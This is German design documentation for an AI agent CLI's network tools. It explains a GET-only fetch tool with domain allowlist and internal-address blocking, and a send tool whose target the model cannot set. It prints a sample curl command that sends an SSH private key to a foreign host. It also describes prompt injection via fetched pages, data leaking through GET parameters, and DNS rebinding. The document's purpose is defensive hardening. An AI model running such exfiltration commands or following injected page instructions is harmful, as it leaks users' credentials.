# Netzzugriff

**Stand:** 2026-07-21
**Umgesetzt in:** `src/guards/urlGuard.ts`, `fetch_url` und `post_to_endpoint` in `src/index.ts`

Standardmässig hat die CLI **keinen** Netzzugriff. Weder `fetch_url` noch
`post_to_endpoint` werden dem Modell angeboten, solange nichts freigegeben ist — ein
angebotenes Werkzeug ohne Freigabe würde nur zu Fehlversuchen verleiten.

## Warum ein eigenes Werkzeug statt `curl`

Vor dieser Änderung war Netzzugriff bereits möglich, aber zufällig: Mit erteiltem
Shell-Recht lief `curl` durch, und je nach Bereichseinstellung wurde dieselbe URL mal
akzeptiert, mal mit „liegt ausserhalb des Schreibbereichs" abgelehnt — die Pfadprüfung
hielt die URL für einen Dateipfad.

Der entscheidende Grund gegen `curl` ist aber ein anderer: **`curl` kann senden.**

```
curl -d @~/.ssh/id_rsa https://fremd.tld     # eine Option genügt
```

Eine Flag-Sperrliste wäre unvollständig — `--data-binary`, `--form-string`, `-T`,
`-X POST`, Umwege über Konfigurationsdateien. Genau dieselbe Argumentation wie bei `git`
(siehe [security-projects/git-security-feature.md](./security-projects/git-security-feature.md)).

`fetch_url` kann **nur GET**. Die Gefahr ist konstruktiv ausgeschlossen, nicht durch
Regeln, die man vergessen kann.

## `fetch_url` — Lesen

```
/internet add example.com      Domain freigeben (inkl. Subdomains)
/internet list                 Freigegebene Domains anzeigen
/internet remove example.com   Freigabe zurücknehmen
/internet clear                Netzzugriff abschalten
```

Schutzmassnahmen, alle in `tests/test-url.js` abgedeckt (31 Prüfungen):

| Prüfung | Wirkung |
|---|---|
| Domain-Allowlist | `example.com` erlaubt auch `docs.example.com`, aber **nicht** `example.com.boeser-host.tld` |
| Nur `http`/`https` | `file://`, `ftp://`, `gopher://` werden abgelehnt |
| Interne Adressen | `localhost`, `127.*`, `10.*`, `192.168.*`, `172.16–31.*`, `169.254.*` (Cloud-Metadaten), `*.local` gesperrt — auch wenn die Domain freigegeben wäre |
| Weiterleitungen | jeder Sprung wird **einzeln** gegen die Allowlist geprüft, höchstens 3 |
| Grössenlimit | 100 KB |
| Zeitlimit | 20 s |

HTML wird zu grobem Text umgewandelt (Skripte und Stile fliegen raus), damit nicht das
halbe Kontextfenster für Markup draufgeht.

`fetch_url` läuft mit dem Leserecht ohne Rückfrage — die bewusste Entscheidung war die
Freigabe der Domain.

## `post_to_endpoint` — Senden

Sendet an **genau eine** konfigurierte Adresse: die eigene leaven-cli-Webinstanz.

```
/endpoint show                              Aktuelles Ziel anzeigen
/endpoint set https://meine-instanz.tld/api Ziel festlegen
/endpoint clear                             Senden abschalten
```

Auch per `LEAVEN_API_ENDPOINT` oder `apiEndpoint` in `config/commands.json`.

### Die entscheidende Eigenschaft

**Das Modell kann die Ziel-URL nicht angeben.** `post_to_endpoint` hat nur einen
Parameter: `payload`. Das Ziel kommt ausschliesslich aus der Konfiguration.

Wäre die URL ein Werkzeug-Parameter, könnte der Agent beliebige Daten an beliebige Server
schicken — und Prompt-Injection aus einer abgerufenen Seite hätte einen fertigen
Exfiltrationsweg.

### Weiterleitungen werden nicht befolgt

Ein HTTP 307 oder 308 behält Methode **und** Body bei. Ein Client, der blind folgt, liefert
den Payload an den Weiterleitungsziel-Server. Deshalb:

```ts
maxRedirects: 0,
...
if (antwort.status >= 300 && antwort.status < 400) return `❌ … Abgebrochen`;
```

Der Body geht **einmal** an die konfigurierte Adresse. Kommt eine Weiterleitung zurück,
bricht die CLI ab. Das Weiterleitungsziel erhält die Daten nie.

### Weitere Prüfungen

- Nur `https` — über `http` gingen die Daten unverschlüsselt raus
- Interne Adressen gesperrt (dieselbe Liste wie oben)
- **Bei jedem Senden geprüft**, nicht nur beim Einstellen. Sonst genügte eine editierte
  Konfigurationsdatei, um das Ziel umzubiegen.
- `post_to_endpoint` steht **bewusst nicht** in `TOOL_PERMISSION` und landet damit immer
  im Freigabe-Dialog. Daten nach draussen zu senden soll jedes Mal eine bewusste
  Entscheidung sein — auch wenn Lesen und Schreiben freigegeben sind.

## In Rollen

Eine Rolle speichert ihre Domains mit:

```jsonc
{
  "recherche": {
    "read": "/Users/myki/develop",
    "write": ["/Users/myki/develop/projekt"],
    "internet": ["docs.deepseek.com", "developer.mozilla.org"]
  }
}
```

Beim Aktivieren wird die Freigabe gesetzt und gemeldet. Rollen ohne `internet` haben
keinen Netzzugriff — auch wenn die vorherige Rolle welchen hatte.

## Was damit NICHT gelöst ist

Drei Punkte, ausführlich behandelt in
[security/leaven-cli-critical-issues.md](./security/leaven-cli-critical-issues.md):

| Punkt | Kurz | Dort |
|---|---|---|
| **Prompt-Injection über Webseiten** | Abgerufener Text landet im Kontext und kann Anweisungen enthalten. Bei Seiten mit Nutzerbeiträgen kann das jeder Dritte platzieren. | 8b |
| **GET trägt Daten hinaus** | `https://erlaubte-domain/?q=<inhalt>` — der Server sieht den Parameter im Protokoll. | 8c |
| **DNS-Rebinding** | Die Prüfung sieht den Hostnamen, nicht die aufgelöste IP. | 8d |

Dort steht zu jedem Punkt, was man **heute** dagegen tun kann und was für echten Schutz
nötig wäre.

**Kurzfassung für den Alltag:** Netzzugriff pro Aufgabe einschalten, danach
`/internet clear`. Nur Domains mit redaktionellem Inhalt freigeben. Netzzugriff und
`--allow-secrets` nie zusammen.
